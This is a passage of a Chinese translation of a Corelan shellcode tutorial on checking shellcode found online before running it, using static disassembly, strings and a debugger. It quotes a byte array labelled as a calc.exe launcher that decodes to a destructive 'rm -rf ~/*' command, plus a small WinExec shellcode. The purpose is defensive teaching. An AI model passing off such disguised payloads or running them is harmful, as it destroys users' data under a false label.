}
在开始这个教程前先把这些工具安装好！同时，记住我实在XPSP3平台下写这个教程的，所以如
果你用不同版本的操作系统时一些地址会不同。
除了这些工具和脚本，你还需要健康的头脑，好的普通常识和读懂/理解/写一些基本的
perl/c代码+基本的汇编知识。
测试现有的 sssshhhheeeellllllllccccooooddddeeee
在看一下shellcode是如何建造的之前，我想展示一些测试已经写好的shellcode或者你自
己的shellcode的技术。
而且这个技术能够在你运行shellcode之前看出它是用来干嘛的（这是必须的，当你想鉴
定一下从网上拿来的shellcode并且不想损坏自己的操作系统）。
通常，shellcode是用机器码呈现出来的，在找来的exploit例子里的字节数组里，或者由
Metasploit产生。
我们要怎样测试或者鉴定这个shellc是用来干什么的？
首先，我们需要把这些字节转化成指令因此我们能明白它是干嘛的。
有两种方法：
把静态字节/机器码转化为指令，然后读产生汇编代码。优点是你不需要执行这个代
码来看它到底是干嘛的（当shellcode在执行时会被解码时，这是必须的）。
把静态字节/机器码放到一个示例脚本里（比如上面的C代码），制造/编译，在调试
器里运行。确保设置了适当的断点（或者在代码前面追加0xcc），因此代码将不会运行。毕
竟，你只不过是想知道shellcode是干什么的，没必要自己运行（发现他是假的并且是设计
来破坏你的系统）。这很明显是一个好方法，但也比较危险因为一个简单的错误会破坏你的
系统。
方法一：静态分析
EEEExxxxaaaammmmpppplllleeee1111：
假设你在网上找到这个shellcode并且你想知道它是用来干嘛的但是不运行这个exploit：
//thiswillspawncalc.exe
charshellcode[]=
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20"
"\x2F\x2A\x20\x32\x3e\x20\x2f\x64\x65"
"\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
你信任这个代码？因为它写着生成calc.exe
我们来看一下。用下面的脚步来把机器码写入到二进制文件里：
pveWritebin.pl:
#!/usr/bin/perl
#PerlscriptwrittenbyPeterVanEeckhoutte
#http://www.corelan.be:8800
#Thisscripttakesafilenameasargument
#willwritebytesin\xformattothefile
#
if($#ARGVne0){
print" usage:$0".chr(34)."outputfilename".chr(34)."\n";
exit(0);
}
system("del$ARGV[0]");
my$shellcode="Youforgottopaste".
"yourshellcodeinthepveWritebin.pl".
"file";
#openfileinbinarymode
print"Writingto".$ARGV[0]."\n";
open(FILE,">$ARGV[0]");
binmodeFILE;
printFILE$shellcode;
close(FILE);
print"Wrote".length($shellcode)."bytestofile\n";
将shellcode贴到perl脚本里然后运行脚本：
#!/usr/bin/perl
#PerlscriptwrittenbyPeterVanEeckhoutte
#http://www.corelan.be:8800
#Thisscripttakesafilenameasargument
#willwritebytesin\xformattothefile
# if($#ARGVne0){
print" usage:$0".chr(34)."outputfilename".chr(34)."\n";
exit(0);
}
system("del$ARGV[0]");
my$shellcode="\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20".
"\x2F\x2A\x20\x32\x3e\x20\x2f\x64\x65".
"\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
#openfileinbinarymode
print"Writingto".$ARGV[0]."\n";
open(FILE,">$ARGV[0]");
binmodeFILE;
printFILE$shellcode;
close(FILE);
print"Wrote".length($shellcode)."bytestofile\n";
C:\shellcode>perlpveWritebin.plc:\tmp\shellcode.bin
Writingtoc:\tmp\shellcode.bin
Wrote26bytestofile
你要做的第一件事，在反汇编之前，就是查看这个文件的目录。只看文件排除了这个文件
是假的exploit或者不是的事实。
C:\shellcode>typec:\tmp\shellcode.bin
rm-rf~/*2>/dev/null&
C:\shellcode>
=>hmmm，这个可能会产生问题。事实上如果你运行这个shellcode，在一个Linux系统上，
你可能已经弄坏你的系统。（换言之，如果一个系统调用已经被这个代码调用并且在你的系
统上执行）
另一种方法，你可以在linux上用“strings”命令。把真个shellcode写入到文件中然后再
上面运行这个“string”。
xxxx@bt4:/tmp#stringsshellcode.bin
rm-rf~/*2>/dev/null&
Skylined也指出我们也可以用Testival/Beta3来鉴定shellcode。
Beta3：
BETA3-decode\x
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20"
"\x2F\x2A\x20\x32\x3e\x20\x2f\x64\x65"
"\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
^Z
Char0@0x00doesnotmatchencoding:'"'.
Char37@0x25doesnotmatchencoding:'"'.
Char38@0x26doesnotmatchencoding:'\n'.
Char39@0x27doesnotmatchencoding:'"'.
Char76@0x4Cdoesnotmatchencoding:'"'.
Char77@0x4Ddoesnotmatchencoding:'\n'.
Char78@0x4Edoesnotmatchencoding:'"'.
Char111@0x6Fdoesnotmatchencoding:'"'.
Char112@0x70doesnotmatchencoding:';'.
Char113@0x71doesnotmatchencoding:'\n'.
rm-rf~/*2>/dev/null&
Testival实际上能够用来运行shellcode--当然--是危险的当你试着找出一些模糊的shellcode
实际上所做的。但是它依然是有帮助的如果你测试你自己的shellcode。
Example2：
这个怎么样：
#Metasploitgenerated–calc.exe–x86–WindowsXPProSP2
my$shellcode="\x68\x97\x4C\x80\x7C\xB8".
"\x4D\x11\x86\x7C\xFF\xD0";
把shellcode写入文件然后看下目录：
C:\shellcode>perlpveWritebin.plc:\tmp\shellcode.bin
Writingtoc:\tmp\shellcode.bin
Wrote12bytestofile
C:\shellcode>typec:\tmp\shellcode.bin
hùLÇ|╕M◄å|╨
C:\shellcode>
让我们反汇编这些字节成指令：
C:\shellcode>"c:\programfiles\nasm\ndisasm.exe"-b32c:\tmp\shellcode.bin
00000000 68974C807C pushdword0x7c804c97
00000005 B84D11867C moveax,0x7c86114d
0000000A FFD0 calleax
你不需要运行这个shellcode来知道它将要干什么。
如果这个exploit的确是为WindowsXPProSP2，然后将会发生这个：
在XPSP2的0x7c804c97地址处，我们能发现（windbg的输出）：
0:001>d0x7c804c97
7c804c975772697465004261-7365436865636b41Write.BaseCheckA
7c804ca77070636f6d706174-4361636865004261ppcompatCache.Ba
7c804cb77365436c65616e75-70417070636f6d70seCleanupAppcomp
7c804cc76174436163686500-42617365436c6561atCache.BaseClea
7c804cd76e7570417070636f-6d70617443616368nupAppcompatCach
7c804ce765537570706f7274-004261736544756deSupport.BaseDum
7c804cf770417070636f6d70-6174436163686500pAppcompatCache.
7c804d0742617365466c7573-68417070636f6d70BaseFlushAppcomp
所以pushdword0x7c804c97将会push“write”到堆栈
接下来，0x7c86114d赋到eax中然后一个eax的call调用。在0x7c86114d,我们发现：
0:001>ln0x7c86114d
(7c86114d)kernel32!WinExec|(7c86123c)kernel32!`string'
Exactmatches:
kernel32!WinExec=
结论：这个shellcode将会指向“write”（=wordPad）。
如果“windowsXPSP2”指示器不对，下面的将会发生（在XPSP3下的例子）：
0:001>d0x7c804c97
7c804c97 624f626a65637400-417474616368436f bObject.AttachCo
7c804ca7 6e736f6c65004261-636b757052656164 nsole.BackupRead
7c804cb7 004261636b757053-65656b004261636b .BackupSeek.Back
7c804cc7 7570577269746500-4261736543686563 upWrite.BaseChec
7c804cd7 6b417070636f6d70-6174436163686500 kAppcompatCache.
7c804ce7 42617365436c6561-6e7570417070636f BaseCleanupAppco
7c804cf7 6d70617443616368-650042617365436c mpatCache.BaseCl
7c804d07 65616e7570417070-636f6d7061744361 eanupAppcompatCa
0:001>ln0x7c86114d
(7c86113a) kernel32!NumaVirtualQueryNode+0x13
| (7c861437) kernel32!GetLogicalDriveStringsW
这个看起来没做什么富有成效....
方法2：动态分析
当payload/shellcode被编码（在文章后面会提到），或者--大体上--反汇编产生的指令第一
眼看起来不怎么有用...然后我们可能需要更进一步分析。举个例子，如果shellcode被编码了，
当转化为asm时，我们会看到一些没什么意义的字节，因为他们实际上是编码后的数据，
在执行时会被动态解码，来产生原始的shellcode。
你可以试着手工模仿解码器循环，但是这会花太长的时间。你也可以运行代码，注意发
生了什么，用断点来阻塞动态指行。
这种技术是有危险性的，需要时刻关注和理解下一个指令将要干什么。所以我不会立刻
解释这种方法确切的步骤。当你读接下来的教程时，会给出在调试器中加载shellcode的例
子，然后单步执行。
记住：
断开网络
执行时做记录
在shellcode即将加载之前确保设了断点（你将会在一会儿明白我的意思）
不要单纯运行代码。用F7来单步执行每条指令。看到call/jmp/...指令时（或者是一些指向
其他地方的跳转指令），在执行前先看看call/jmp指令指向的地方将会做什么。
如果shellcode用了解码器，试着定位到原始shellcode的地址（这或者就在解码器循环或者
其中一个寄存器指向的地址中的一个）。在产生完原始的代码后，将会调用一个跳转指令到
shellcode开头（假使原始的shellcode就产生在循环之后），这将会在循环时对一个特定的计
数器比较之后执行。在那时，还是不要运行shellcode。
当原始的shellcode已经被还原之后，先看一下指令，在不运行代码的情况下试着猜测代
码的意图。
小心并且准备着去掉/重装你的系统当你被菜掉时。
从 CCCC 到 SSSShhhheeeellllllllccccooooddddeeee
好的，让我们从现在真正开始吧。比如说我们想写个显示一个MessageBox的shellcode，
MessageBox上的文本是“YouhavebeenpwnedbyCorelan”。我知道，这个在实际生活中的
exploit中是不怎么有用，但是在你想写或者修改出更复杂的shellcode之前，它会教你一些
基本的技术。
作为开始，我们会用C来写代码。为了这个教程，我决定用lcc-win32编译器。如果你
决定用其他的编译器，概念和最后的结果应该差不多一样。
从 CCCC 到 aaaassssmmmm 的执行
源代码（corelan1.c):
#include
intmain(intargc,char**argv)
{